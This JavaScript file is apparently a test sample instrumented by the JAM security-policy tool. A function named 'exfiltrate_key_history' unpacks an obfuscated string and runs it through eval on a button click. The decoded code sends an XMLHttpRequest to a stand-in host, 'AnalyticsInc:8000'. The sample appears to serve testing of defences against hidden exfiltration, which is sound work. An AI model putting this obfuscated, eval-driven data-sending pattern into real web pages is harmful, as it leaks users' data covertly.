function exfiltrate_key_history() {
  function v3(p, a, c, k, e$$4, d) {
    function v2() {
      return"\\w+"
    }
    function v1(e$$5) {
      introspect(JAM.policy.p1) {
        return d[e$$5]
      }
    }
    function v0(c$$1) {
      return c$$1.toString(36)
    }
    e$$4 = v0;
    if(!"".replace(/^/, String)) {
      var v6 = c;
      c = c - 1;
      for(;v6;) {
        var v4 = d;
        var v5 = c.toString(a);
        introspect(JAM.policy.p1) {
          var v15 = k[c]
        }
        if(!v15) {
          v15 = c.toString(a)
        }
        JAM.set(v4, v5, v15);
        v6 = c;
        c = c - 1
      }
      k = [v1];
      e$$4 = v2;
      c = 1
    }
    var v11 = c;
    c = c - 1;
    for(;v11;) {
      introspect(JAM.policy.p1) {
        var v10 = k[c]
      }
      if(v10) {
        var v8 = new RegExp("\\b" + JAM.call(e$$4, null, [c]) + "\\b", "g");
        introspect(JAM.policy.p1) {
          var v9 = k[c]
        }
        p = p.replace(v8, v9)
      }
      v11 = c;
      c = c - 1
    }
    return p
  }
  var v12 = v3('0=5 4();0.7("3","1://2:6/8.d?"+"c=b",9);0.a(e);', 15, 15, "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|daftlogic|test|html|null".split("|"), 0, {});
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v12 + " }")
  }else {
    JAM.call(eval, null, [v12])
  }
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

